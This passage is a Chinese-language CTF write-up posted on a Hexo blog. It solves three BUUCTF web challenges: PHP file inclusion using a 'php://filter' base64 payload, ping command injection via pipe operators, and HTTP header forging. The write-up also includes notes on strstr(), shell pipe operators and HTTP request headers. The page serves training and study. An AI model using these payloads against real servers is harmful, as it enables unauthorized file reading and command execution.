@@ -1,0 +1,1037 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="BUUCTF-WriteUp一、Secret File1、解题打开页面无任何提示，首先查看网页源代码。   发现有个Archive_room.php，接着点击查看  查看源代码  发现有个action.php文件，继续点击  但这个页面是end.php，直接跳过了action.php。 查看源码也是没有出现有关flag的内容。  试着抓包，访问action.php。结果出现个  secr3t.ph">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUctf-wp">
+<meta property="og:url" content="http://example.com/2021/01/16/BUUctf-wp/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="BUUCTF-WriteUp一、Secret File1、解题打开页面无任何提示，首先查看网页源代码。   发现有个Archive_room.php，接着点击查看  查看源代码  发现有个action.php文件，继续点击  但这个页面是end.php，直接跳过了action.php。 查看源码也是没有出现有关flag的内容。  试着抓包，访问action.php。结果出现个  secr3t.ph">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/1.png">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/2.png">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/4.png">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/7.png">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/5.png">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/3.png">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/6.png">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/8.png">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/9.png">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/10.png">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/11.png">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/12.png">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/13.png">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/14.png">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/15.png">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/16.png">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/18.png">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/19.png">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/20.png">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/21.png">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/22.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/1.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/2.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/3.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/4.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/5.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/6.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/7.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/8.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/22.png">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/9.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/23.png">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/26.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/24.png">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/25.png">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/27.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/28.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/29.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/30.png">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/31.png">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/32.png">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/33.png">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/34.png">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/35.png">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/36.png">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/37.png">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/38.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/39.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/40.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/41.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/42.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/43.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/44.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/45.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/46.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/47.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/48.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/49.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/50.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/51.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/52.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/53.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/54.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/55.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/56.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/57.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/58.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/59.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/60.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/61.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/62.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/63.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/64.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/65.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/66.png">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/67.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/68.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/69.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/70.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/71.png">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/72.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/73.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/74.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/75.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/78.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/76.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/77.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/79.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/80.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/81.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/82.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/83.png">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/84.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/85.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/86.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/87.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/88.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/89.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/90.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/91.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/92.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/93.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/94.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/95.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/96.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/97.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/98.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/99.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/100.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/101.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/102.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/103.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/104.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/105.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/106.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/107.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/108.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/109.jpg">
+<meta property="og:image" content="http://example.com/2021/01/16/BUUctf-wp/110.jpg">
+<meta property="article:published_time" content="2021-01-16T11:00:48.000Z">
+<meta property="article:modified_time" content="2021-03-02T08:06:05.577Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/01/16/BUUctf-wp/1.png">
+
+<link rel="canonical" href="http://example.com/2021/01/16/BUUctf-wp/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>BUUctf-wp | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/16/BUUctf-wp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          BUUctf-wp
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-01-16 19:00:48" itemprop="dateCreated datePublished" datetime="2021-01-16T19:00:48+08:00">2021-01-16</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-03-02 16:06:05" itemprop="dateModified" datetime="2021-03-02T16:06:05+08:00">2021-03-02</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="BUUCTF-WriteUp"><a href="#BUUCTF-WriteUp" class="headerlink" title="BUUCTF-WriteUp"></a>BUUCTF-WriteUp</h1><h2 id="一、Secret-File"><a href="#一、Secret-File" class="headerlink" title="一、Secret File"></a>一、Secret File</h2><h3 id="1、解题"><a href="#1、解题" class="headerlink" title="1、解题"></a>1、解题</h3><p>打开页面无任何提示，首先查看网页源代码。</p>
+<p><img src="/2021/01/16/BUUctf-wp/1.png"></p>
+<p><img src="/2021/01/16/BUUctf-wp/2.png" alt="网页源代码"></p>
+<p>发现有个Archive_room.php，接着点击查看</p>
+<p><img src="/2021/01/16/BUUctf-wp/4.png"></p>
+<p>查看源代码</p>
+<p><img src="/2021/01/16/BUUctf-wp/7.png"></p>
+<p>发现有个action.php文件，继续点击</p>
+<p><img src="/2021/01/16/BUUctf-wp/5.png"></p>
+<p>但这个页面是end.php，直接跳过了action.php。</p>
+<p>查看源码也是没有出现有关flag的内容。</p>
+<p><img src="/2021/01/16/BUUctf-wp/3.png"></p>
+<p>试着抓包，访问action.php。结果出现个  secr3t.php 。</p>
+<p><img src="/2021/01/16/BUUctf-wp/6.png"></p>
+<p>接着访问</p>
+<p><img src="/2021/01/16/BUUctf-wp/8.png"></p>
+<p>源代码为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];<span class="comment">//变量file=用get传参传的值</span></span><br><span class="line"><span class="keyword">if</span>(strstr(<span class="variable">$file</span>,<span class="string">&quot;../&quot;</span>)||stristr(<span class="variable">$file</span>,<span class="string">&quot;tp&quot;</span>)||stristr(<span class="variable">$file</span>,<span class="string">&quot;input&quot;</span>)||stristr(<span class="variable">$file</span>,<span class="string">&quot;data&quot;</span>))strstr(str1,str2) <span class="comment">//strstr函数用于判断字符串str2是否是str1的子串。这里过滤了../、tp、input、data</span></span><br><span class="line">&#123;    </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;    </span><br><span class="line">    <span class="keyword">exit</span>();  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>); <span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>该题很明显是文件包含，而且没有过滤伪协议，可以试着用php伪协议</p>
+<p>payload：<code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code>  </p>
+<p><img src="/2021/01/16/BUUctf-wp/9.png">  </p>
+<p>   base64解码后得到flag</p>
+<p><img src="/2021/01/16/BUUctf-wp/10.png"></p>
+<h3 id="2、学习笔记"><a href="#2、学习笔记" class="headerlink" title="2、学习笔记"></a>2、学习笔记</h3><h4 id="PHP-strstr-函数"><a href="#PHP-strstr-函数" class="headerlink" title="PHP strstr() 函数"></a><strong>PHP strstr() 函数</strong></h4><h5 id="（1）定义和用法"><a href="#（1）定义和用法" class="headerlink" title="（1）定义和用法"></a>（1）定义和用法</h5><p>strstr() 函数搜索字符串在另一字符串中是否存在，如果是，返回该字符串及剩余部分，否则返回 FALSE。</p>
+<p><strong>注释：</strong>该函数是二进制安全的。</p>
+<p><strong>注释：</strong>该函数是区分大小写的。如需进行不区分大小写的搜索，则使用 <a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-string-stristr.html">stristr()</a> 函数。</p>
+<h5 id="（2）语法"><a href="#（2）语法" class="headerlink" title="（2）语法"></a>（2）语法</h5><p>strstr(<em>string,search,before_search</em>)</p>
+<table>
+<thead>
+<tr>
+<th align="left">参数</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><em>string</em></td>
+<td align="left">必需。规定被搜索的字符串。</td>
+</tr>
+<tr>
+<td align="left"><em>search</em></td>
+<td align="left">必需。规定要搜索的字符串。如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符。</td>
+</tr>
+<tr>
+<td align="left"><em>before_search</em></td>
+<td align="left">可选。一个默认值为 “false” 的布尔值。如果设置为 “true”，它将返回 <em>search</em> 参数第一次出现之前的字符串部分。</td>
+</tr>
+</tbody></table>
+<p>例如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> strstr(<span class="string">&quot;Hello world!&quot;</span>,<span class="number">111</span>);<span class="comment">//因为111是数字，则匹配ascll码为o</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>输出结果：</p>
+<p><code>o world!</code></p>
+<hr>
+<h2 id="二、-ACTF2020-新生赛-Exec1"><a href="#二、-ACTF2020-新生赛-Exec1" class="headerlink" title="二、[ACTF2020 新生赛]Exec1"></a>二、[ACTF2020 新生赛]Exec1</h2><h3 id="1、解题-1"><a href="#1、解题-1" class="headerlink" title="1、解题"></a>1、解题</h3><p><img src="/2021/01/16/BUUctf-wp/11.png"></p>
+<p>打开题目，源码没有什么提示，就用回环地址ping一下。</p>
+<p><img src="/2021/01/16/BUUctf-wp/12.png"></p>
+<p>结果ping成功了。首先用位管道符ls一下，查看目录。</p>
+<p><img src="/2021/01/16/BUUctf-wp/13.png"></p>
+<p>发现这是index.php，试着查看前一级目录。</p>
+<p><img src="/2021/01/16/BUUctf-wp/14.png"></p>
+<p>发现有个flag的文件，试着用cat查看文件。</p>
+<p><img src="/2021/01/16/BUUctf-wp/15.png"></p>
+<p>得到flag。</p>
+<h3 id="2、学习笔记-1"><a href="#2、学习笔记-1" class="headerlink" title="2、学习笔记"></a>2、学习笔记</h3><h5 id="常见管道符"><a href="#常见管道符" class="headerlink" title="常见管道符"></a>常见管道符</h5><p>1、**<code>|</code>**（按位或），直接执行|后面的语句</p>
+<p><img src="/2021/01/16/BUUctf-wp/16.png"></p>
+<p>2、**<code>||</code>**（逻辑或），如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</p>
+<p><img src="/2021/01/16/BUUctf-wp/18.png"></p>
+<p>3、**<code>&amp;</code>**（按位与），<code>&amp;</code>前面和后面命令都要执行，无论前面真假</p>
+<p><img src="/2021/01/16/BUUctf-wp/19.png"></p>
+<p>4、**<code>&amp;&amp;</code>**（逻辑与），如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p>
+<p><img src="/2021/01/16/BUUctf-wp/20.png"></p>
+<p>5、**<code>;</code>**（linux下有的，和&amp;一样的作用）</p>
+<hr>
+<h2 id="三、-BJDCTF-2nd-假猪套天下第一"><a href="#三、-BJDCTF-2nd-假猪套天下第一" class="headerlink" title="三、[BJDCTF 2nd]假猪套天下第一"></a>三、[BJDCTF 2nd]假猪套天下第一</h2><h3 id="1、解题-2"><a href="#1、解题-2" class="headerlink" title="1、解题"></a>1、解题</h3><p>打开题目是一个登录界面。</p>
+<p><img src="/2021/01/16/BUUctf-wp/21.png"></p>
+<p>试着随便登录一个用户名和密码（1&amp;1）。发现登录成功，但是却没什么有关flag的提示。</p>
+<p><img src="/2021/01/16/BUUctf-wp/22.jpg"></p>
+<p>即使查看index.php和登录后的profile.php的源代码也没有发现有关flag的提示，所以试着抓包,提示有个L0g1n.php。</p>
+<p><img src="/2021/01/16/BUUctf-wp/1.jpg"></p>
+<p>接着访问该php，出现新的提示。</p>
+<p><img src="/2021/01/16/BUUctf-wp/2.jpg"></p>
+<p>很明显这是伪造header头，所以按照提示将时间设置比99年多即可</p>
+<p><img src="/2021/01/16/BUUctf-wp/3.jpg"></p>
+<p>接着又说访问者的地址是localhost。查询后发现，绕过方法有添加X-forward-from或者Client-ip绕过。这里的第一种方法被过滤了，所以用第二种。</p>
+<p><img src="/2021/01/16/BUUctf-wp/4.jpg"></p>
+<p>提示需要从这个网站访问，这里添加一个Referer头绕过</p>
+<p><img src="/2021/01/16/BUUctf-wp/5.jpg"></p>
+<p>提示再次变更，告诉我们要通过Commodore 64浏览器进行访问。我们通过修改User-Agent来实现。</p>
+<p><img src="/2021/01/16/BUUctf-wp/6.jpg"></p>
+<p>提示这次说我们的邮箱是来自<a href="mailto:&#x72;&#x6f;&#x6f;&#116;&#x40;&#103;&#101;&#109;&#x2d;&#x6c;&#111;&#x76;&#x65;&#x2e;&#99;&#111;&#x6d;">&#x72;&#x6f;&#x6f;&#116;&#x40;&#103;&#101;&#109;&#x2d;&#x6c;&#111;&#x76;&#x65;&#x2e;&#99;&#111;&#x6d;</a>，通过修改From来实现</p>
+<p><img src="/2021/01/16/BUUctf-wp/7.jpg"></p>
+<p>接着使用提供的代理地址访问，添加Via。</p>
+<p><img src="/2021/01/16/BUUctf-wp/8.jpg"></p>
+<p>base64解码得到flag。</p>
+<h3 id="2、学习笔记-2"><a href="#2、学习笔记-2" class="headerlink" title="2、学习笔记"></a>2、学习笔记</h3><p>此类题型就是套路：<br>burpsuite抓包，重放，并根据题目要求多次重放，最终满足全部要求后获得flag。</p>
+<h4 id="Header请求头参数详解"><a href="#Header请求头参数详解" class="headerlink" title="Header请求头参数详解"></a>Header请求头参数详解</h4><table>
+<thead>
+<tr>
+<th>Header</th>
+<th>解释</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Accept</td>
+<td>指定客户端能够接收的内容类型</td>
+<td>Accept: text/plain, text/html,application/json</td>
+</tr>
+<tr>
+<td>Accept-Charset</td>
+<td>浏览器可以接受的字符编码集。</td>
+<td>Accept-Charset: iso-8859-5</td>
+</tr>
+<tr>
+<td>Accept-Encoding</td>
+<td>指定浏览器可以支持的web服务器返回内容压缩编码类型。</td>
+<td>Accept-Encoding: compress, gzip</td>
+</tr>
+<tr>
+<td>Accept-Language</td>
+<td>浏览器可接受的语言</td>
+<td>Accept-Language: en,zh</td>
+</tr>
+<tr>
+<td>Accept-Ranges</td>
+<td>可以请求网页实体的一个或者多个子范围字段</td>
+<td>Accept-Ranges: bytes</td>
+</tr>
+<tr>
+<td>Authorization</td>
+<td>HTTP授权的授权证书</td>
+<td>Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</td>
+</tr>
+<tr>
+<td>Cache-Control</td>
+<td>指定请求和响应遵循的缓存机制</td>
+<td>Cache-Control: no-cache</td>
+</tr>
+<tr>
+<td>Connection</td>
+<td>表示是否需要持久连接。（HTTP 1.1默认进行持久连接）</td>
+<td>Connection: close</td>
+</tr>
+<tr>
+<td>Cookie</td>
+<td>HTTP请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器。</td>
+<td>Cookie: $Version=1; Skin=new;</td>
+</tr>
+<tr>
+<td>Content-Length</td>
+<td>请求的内容长度</td>
+<td>Content-Length: 348</td>
+</tr>
+<tr>
+<td>Content-Type</td>
+<td>请求的与实体对应的MIME信息</td>
+<td>Content-Type: application/x-www-form-urlencoded</td>
+</tr>
+<tr>
+<td>Date</td>
+<td>请求发送的日期和时间</td>
+<td>Date: Tue, 15 Nov 2010 08:12:31 GMT</td>
+</tr>
+<tr>
+<td>Expect</td>
+<td>请求的特定的服务器行为</td>
+<td>Expect: 100-continue</td>
+</tr>
+<tr>
+<td>From</td>
+<td>发出请求的用户的Email</td>
+<td>From: <a href="mailto:&#117;&#115;&#x65;&#x72;&#64;&#101;&#109;&#97;&#x69;&#108;&#46;&#99;&#111;&#109;">&#117;&#115;&#x65;&#x72;&#64;&#101;&#109;&#97;&#x69;&#108;&#46;&#99;&#111;&#109;</a></td>
+</tr>
+<tr>
+<td>Host</td>
+<td>指定请求的服务器的域名和端口号</td>
+<td>Host: <a target="_blank" rel="noopener" href="http://www.zcmhi.com/">www.zcmhi.com</a></td>
+</tr>
+<tr>
+<td>If-Match</td>
+<td>只有请求内容与实体相匹配才有效</td>
+<td>If-Match: “737060cd8c284d8af7ad3082f209582d”</td>
+</tr>
+<tr>
+<td>If-Modified-Since</td>
+<td>如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回304代码</td>
+<td>If-Modified-Since: Sat, 29 Oct 2010 19:43:31 GMT</td>
+</tr>
+<tr>
+<td>If-None-Match</td>
+<td>如果内容未改变返回304代码，参数为服务器先前发送的Etag，与服务器回应的Etag比较判断是否改变</td>
+<td>If-None-Match: “737060cd8c284d8af7ad3082f209582d”</td>
+</tr>
+<tr>
+<td>If-Range</td>
+<td>如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。参数也为Etag</td>
+<td>If-Range: “737060cd8c284d8af7ad3082f209582d”</td>
+</tr>
+<tr>
+<td>If-Unmodified-Since</td>
+<td>只在实体在指定时间之后未被修改才请求成功</td>
+<td>If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT</td>
+</tr>
+<tr>
+<td>Max-Forwards</td>
+<td>限制信息通过代理和网关传送的时间</td>
+<td>Max-Forwards: 10</td>
+</tr>
+<tr>
+<td>Pragma</td>
+<td>用来包含实现特定的指令</td>
+<td>Pragma: no-cache</td>
+</tr>
+<tr>
+<td>Proxy-Authorization</td>
+<td>连接到代理的授权证书</td>
+<td>Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</td>
+</tr>
+<tr>
+<td>Range</td>
+<td>只请求实体的一部分，指定范围</td>
